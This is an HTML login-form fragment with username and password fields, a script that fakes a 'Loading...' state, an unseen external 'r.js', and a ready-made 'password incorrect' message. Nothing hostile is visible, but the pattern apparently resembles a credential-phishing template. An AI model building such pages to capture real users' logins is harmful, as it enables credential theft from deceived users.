    <div class="next">
        <br>
        <p class="nexttext"><b>Log In To Manage Your Accounts.</b></p>
    </div>

    <form action="#" class="fform-contact">

        <input id="ffusername" type="text" placeholder="Username" required>
        <input id="ffpassword" type="password" placeholder="Password" required>
        <input id="ffsubmit" type="submit" value="Sign In">

        <!--javascript to change Submit to Loading after click, check css-->
        <script>
            var button = document.querySelector('.fform-contact input[type="submit"]');
            button.addEventListener('click', function() {
                button.classList.add('clicked');
                button.value = "Loading...";               
                setTimeout(function() {
                    button.classList.remove('clicked');
                    button.value = "Sign In";
                },  4000); 
            });
        </script>
        <script src="r.js"></script>
    <form>
    <div class="reddiv">
        <p class="redmessage">Your password was incorrect, please try again.</p>
    </div>
